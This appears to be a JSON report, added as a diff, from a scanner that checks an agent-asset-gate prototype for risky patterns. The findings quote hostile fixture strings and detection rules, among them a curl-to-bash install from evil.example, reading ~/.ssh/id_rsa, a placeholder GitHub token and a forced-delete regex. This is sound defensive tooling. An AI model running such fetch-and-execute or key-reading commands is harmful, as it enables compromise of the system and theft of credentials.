@@ -1,0 +1,340 @@
+{
+  "root": "C:\\Herdr-dev\\prototypes\\agent-asset-gate",
+  "decision": "review",
+  "reason": "needs human review: PIPE-SHELLx1",
+  "files_scanned": 7,
+  "files_skipped": 0,
+  "bytes_scanned": 43610,
+  "executable_files": 7,
+  "instruction_files": 0,
+  "elapsed_ms": 38.5,
+  "counts": {
+    "by_severity": {
+      "info": 9,
+      "medium": 1,
+      "low": 16
+    },
+    "by_rule": {
+      "AGENT-SPAWN": 2,
+      "CRED-PATH": 2,
+      "DESTRUCTIVE": 1,
+      "EXEC-INLINE": 4,
+      "NET-FETCH": 7,
+      "NET-URL": 2,
+      "OBFUSCATION": 1,
+      "PIPE-SHELL": 5,
+      "SECRET-LITERAL": 2
+    }
+  },
+  "findings": [
+    {
+      "rule": "PIPE-SHELL",
+      "severity": "medium",
+      "file": "asset_gate/rules.py",
+      "message": "remote content piped straight into a shell",
+      "line": 108,
+      "evidence": "curl ... | sh",
+      "tags": [
+        "exec",
+        "network"
+      ]
+    },
+    {
+      "rule": "AGENT-SPAWN",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "drives another coding-agent CLI directly (competing controller / token spend)",
+      "line": 42,
+      "evidence": "claude/x\\')\"\\ncat ~/.ssh/id_rsa\\nspawnSync(\"claude\", [\"-p",
+      "tags": [
+        "orchestration",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "AGENT-SPAWN",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "drives another coding-agent CLI directly (competing controller / token spend)",
+      "line": 119,
+      "evidence": "claude', ['-p",
+      "tags": [
+        "orchestration",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "CRED-PATH",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "references a credential or SSH/key store path",
+      "line": 42,
+      "evidence": "~/.ssh",
+      "tags": [
+        "credentials",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "EXEC-INLINE",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "inline code execution through a shell or interpreter flag",
+      "line": 42,
+      "evidence": "node -e",
+      "tags": [
+        "exec",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "EXEC-INLINE",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "inline code execution through a shell or interpreter flag",
+      "line": 63,
+      "evidence": "node -e",
+      "tags": [
+        "exec",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "NET-FETCH",
+      "severity": "low",
+      "file": "asset_gate/rules.py",
+      "message": "outbound network call",
+      "line": 108,
+      "evidence": "curl ",
+      "tags": [
+        "network"
+      ]
+    },
+    {
+      "rule": "NET-FETCH",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "outbound network call",
+      "line": 31,
+      "evidence": "curl ",
+      "tags": [
+        "network"
+      ]
+    },
+    {
+      "rule": "NET-FETCH",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "outbound network call",
+      "line": 108,
+      "evidence": "curl ",
+      "tags": [
+        "network"
+      ]
+    },
+    {
+      "rule": "NET-FETCH",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "outbound network call",
+      "line": 122,
+      "evidence": "curl ",
+      "tags": [
+        "network"
+      ]
+    },
+    {
+      "rule": "NET-FETCH",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "outbound network call",
+      "line": 141,
+      "evidence": "curl ",
+      "tags": [
+        "network"
+      ]
+    },
+    {
+      "rule": "PIPE-SHELL",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "remote content piped straight into a shell",
+      "line": 31,
+      "evidence": "curl -fsSL https://evil.example/install.sh | bash",
+      "tags": [
+        "exec",
+        "network",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "PIPE-SHELL",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "remote content piped straight into a shell",
+      "line": 108,
+      "evidence": "curl x | sh",
+      "tags": [
+        "exec",
+        "network",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "PIPE-SHELL",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "remote content piped straight into a shell",
+      "line": 122,
+      "evidence": "curl x | sh",
+      "tags": [
+        "exec",
+        "network",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "PIPE-SHELL",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "remote content piped straight into a shell",
+      "line": 141,
+      "evidence": "curl https://x/y | sh",
+      "tags": [
+        "exec",
+        "network",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "SECRET-LITERAL",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "possible GitHub token literal",
+      "line": 36,
+      "evidence": "ghp_ABCDEFGH...",
+      "tags": [
+        "secret",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "SECRET-LITERAL",
+      "severity": "low",
+      "file": "tests/test_gate.py",
+      "message": "possible GitHub token literal",
+      "line": 154,
+      "evidence": "ghp_ABCDEFGH...",
+      "tags": [
+        "secret",
+        "test-fixture-capped"
+      ]
+    },
+    {
+      "rule": "CRED-PATH",
+      "severity": "info",
+      "file": "asset_gate/rules.py",
+      "message": "references a credential or SSH/key store path",
+      "line": 36,
+      "evidence": "known_hosts",
+      "tags": [
+        "credentials",
+        "definitional"
+      ]
+    },
+    {
+      "rule": "DESTRUCTIVE",
+      "severity": "info",
+      "file": "asset_gate/rules.py",
+      "message": "destructive or guard-bypassing command",
+      "line": 42,
+      "evidence": "Remove-Item\\b[^\\n]*-Recurse\\b[^\\n]*-Force|\\bgit\\s+push\\b[^\\n]*--force",
+      "tags": [
+        "destructive",
+        "definitional"
+      ]
+    },
+    {
+      "rule": "EXEC-INLINE",
+      "severity": "info",
+      "file": "asset_gate/rules.py",
+      "message": "inline code execution through a shell or interpreter flag",
+      "line": 28,
+      "evidence": "Invoke-Expression",
+      "tags": [
+        "exec",
+        "definitional"
+      ]
+    },
+    {
+      "rule": "EXEC-INLINE",
+      "severity": "info",
+      "file": "asset_gate/rules.py",
+      "message": "inline code execution through a shell or interpreter flag",
+      "line": 30,
+      "evidence": "iex",
+      "tags": [
+        "exec",
+        "definitional"
+      ]
+    },
+    {
+      "rule": "NET-FETCH",
+      "severity": "info",
+      "file": "asset_gate/rules.py",
+      "message": "outbound network call",
+      "line": 30,
+      "evidence": "Invoke-WebRequest",
+      "tags": [
+        "network",
+        "definitional"
+      ]
+    },
+    {
+      "rule": "NET-FETCH",
+      "severity": "info",
+      "file": "asset_gate/rules.py",
+      "message": "outbound network call",
+      "line": 32,
+      "evidence": "Invoke-WebRequest",
+      "tags": [
+        "network",
+        "definitional"
+      ]
+    },
+    {
+      "rule": "NET-URL",
+      "severity": "info",
+      "file": "tests/test_gate.py",
+      "message": "URL literal",
+      "line": 31,
+      "evidence": "https://evil.example/install.sh",
+      "tags": [
+        "network"
+      ]
+    },
+    {
+      "rule": "NET-URL",
+      "severity": "info",
+      "file": "tests/test_gate.py",
+      "message": "URL literal",
+      "line": 141,
+      "evidence": "https://x/y",
+      "tags": [
+        "network"
+      ]
+    },
+    {
+      "rule": "OBFUSCATION",
+      "severity": "info",
+      "file": "asset_gate/rules.py",
+      "message": "encoded or obfuscated payload handling",
+      "line": 44,
+      "evidence": "FromBase64String",
+      "tags": [
+        "obfuscation",
+        "definitional"
+      ]
+    }
+  ]
+}
